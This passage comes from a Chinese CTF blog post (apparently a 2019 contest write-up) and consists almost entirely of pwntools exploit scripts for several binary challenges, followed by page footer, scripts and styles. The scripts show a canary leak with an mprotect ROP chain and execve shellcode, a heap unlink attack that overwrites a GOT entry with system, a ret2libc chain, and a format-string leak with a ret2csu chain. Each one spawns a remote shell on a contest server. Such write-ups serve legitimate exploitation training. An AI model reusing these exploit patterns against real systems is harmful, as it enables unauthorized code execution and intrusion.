class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))<span class="number">-0x41</span></span><br><span class="line">success(<span class="string">"canary =====&gt; 0x%x"</span>%canary)</span><br><span class="line">int_0x80=<span class="number">0x4bc587</span></span><br><span class="line">poprdi=<span class="number">0x401e36</span></span><br><span class="line">poprsi=<span class="number">0x401f57</span></span><br><span class="line">poprdx=<span class="number">0x4433e6</span></span><br><span class="line">start_addr=<span class="number">0x400890</span></span><br><span class="line">p.recvuntil(<span class="string">"continue ?"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_addr=elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(bss_addr&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)</span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(read_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"continue ?"</span>,<span class="string">"no"</span>)</span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="玄冥"><a href="#玄冥" class="headerlink" title="玄冥"></a>玄冥</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50007</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"size:"</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'choice &gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020E0</span></span><br><span class="line">target=<span class="number">0x0602020</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=p64(target)+p64(target)+p64(target)+p64(target)+p64(target<span class="number">-0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your data:'</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'free_addr====&gt;0x%x'</span>%free_addr)</span><br><span class="line">libc_base=free_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base====&gt;0x%x'</span>%libc_base)</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,len(p64(system_addr))+<span class="number">1</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">9</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="於讴"><a href="#於讴" class="headerlink" title="於讴"></a>於讴</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50006</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">main_addr=<span class="number">0x04007C3</span></span><br><span class="line">put_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">poprdi=<span class="number">0x414fc3</span></span><br><span class="line">start_libc=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(start_got)+p64(put_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">start_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(start_addr)</span><br><span class="line">libc_base = start_addr - start_libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">bin_sh=<span class="number">0x1633e8</span></span><br><span class="line">system=libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_addr=bin_sh+libc_base</span><br><span class="line">system_addr=system+libc_base</span><br><span class="line"><span class="keyword">print</span> hex(bin_addr)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="副墨"><a href="#副墨" class="headerlink" title="副墨"></a>副墨</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./bf")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50001</span>)</span><br><span class="line">elf=ELF(<span class="string">"./bf"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%17$p%26$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line">array=[<span class="number">7427</span> , <span class="number">39356</span>  ,<span class="number">9595</span>  ,<span class="number">54062</span>  ,<span class="number">67371</span> , <span class="number">42578</span>  ,<span class="number">92585</span>  ,<span class="number">76990</span>  ,<span class="number">22615</span>  ,<span class="number">53318</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">canary=eval(p.recv(<span class="number">18</span>))</span><br><span class="line">success(<span class="string">"canary ==&gt; 0x%x"</span>%canary)</span><br><span class="line">base_addr=eval(p.recv(<span class="number">14</span>))<span class="number">-0x970</span></span><br><span class="line">success(<span class="string">"base_addr ==&gt; 0x%x"</span>%base_addr)</span><br><span class="line">pop_rdi_ret=<span class="number">0xdb3</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(base_addr+<span class="number">0x970</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%19$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">libc_start_main=eval(p.recv(<span class="number">14</span>))<span class="number">-240</span></span><br><span class="line">success(<span class="string">"libc_start_main ==&gt; 0x%x"</span>%libc_start_main)</span><br><span class="line"></span><br><span class="line">system_addr=base_addr+elf.plt[<span class="string">"system"</span>]</span><br><span class="line">foot=base_addr+<span class="number">0xDAA</span></span><br><span class="line">init=base_addr+<span class="number">0xD90</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]+base_addr</span><br><span class="line">puts_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_plt=elf.plt[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(foot)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(init)</span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至Whali3n51@gmail.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>five空间大赛</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" target="_blank" rel="noopener" title="Whali3n51">Whali3n51</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-09-01, 11:22:00</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-12, 16:48:01</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/" title="five空间大赛">http://whali3n51.github.io/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019 Whali3n51</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)" target="_blank" rel="noopener"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#WP复现','#pwn','#re_wp','#re复现',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://s9.rr.itc.cn/r/wapChange/20166_15_14/a1h0j307059539839596.JPEG");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/Whali3n51">github</a>
+    
+</div>
+
+
+</html>
